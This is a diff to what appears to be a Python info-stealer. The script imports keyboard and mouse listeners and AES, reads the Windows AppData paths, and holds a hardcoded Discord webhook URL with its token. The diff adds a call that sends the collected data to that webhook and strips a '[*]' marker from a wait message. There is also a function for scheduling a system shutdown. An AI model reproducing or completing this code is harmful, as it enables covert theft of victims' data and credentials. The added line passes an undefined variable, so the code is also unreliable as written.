@@ -20,7 +20,7 @@ from pynput import mouse, keyboard as pynput_keyboard
 from Crypto.Cipher import AES
 from pathlib import Path
 
-print("[*] Please Wait 30 seconds")
+print("Please Wait 30 seconds")
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -329,7 +329,7 @@ def list_applications_in_folders():
 
 def goon():
     webhook_url = 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH'  # Replace with your actual webhook URL
-    
+    list_applications_in_folders(file_path, webhook_url)
 
 def schedule_shutdown():
 
